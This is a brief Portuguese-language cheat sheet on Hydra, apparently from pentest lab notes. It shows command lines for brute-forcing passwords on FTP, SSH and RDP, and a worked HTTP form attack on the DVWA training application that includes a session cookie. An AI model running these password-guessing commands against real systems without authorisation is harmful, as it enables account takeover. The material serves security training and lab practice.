# HYDRA

Ferramenta de brute force online.

Uso do hydra com usuário:

```bash
hydra -v -l user -P wordlist.txt 192.168.0.100 ftp
```

```bash
hydra -v -l root -P wordlist.txt 192.168.0.100 ssh
```

```bash
hydra -v -l administrator -P wordlist.txt 192.168.0.100 rdp
```

**No RDP pode não funcionar como esperado.**

Uso do hydra com wordlist de usuário:

```bash
hydra -v -L users.txt -P wordlist.txt 192.168.0.100 21
```

## Brute force HTTP

URL: http://192.168.0.100/dvwa/vulnerabilities/brute/?username=teste&password=teste&Login=Login#

```bash
hydra -v -l admin -P pass.txt 192.168.0.100 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=4h91dkp7pcp8184nil8rt9ok13; security=low"
```

**^USER^** ==> Será onde o usuário será inserido.  
**^PASS^** ==> Será a senha.  
**Username and/or password incorrect.** ==> É o parâmetro de senha incorreta que muda conforme aplicação.  
**H** ==> Configuração do Header.
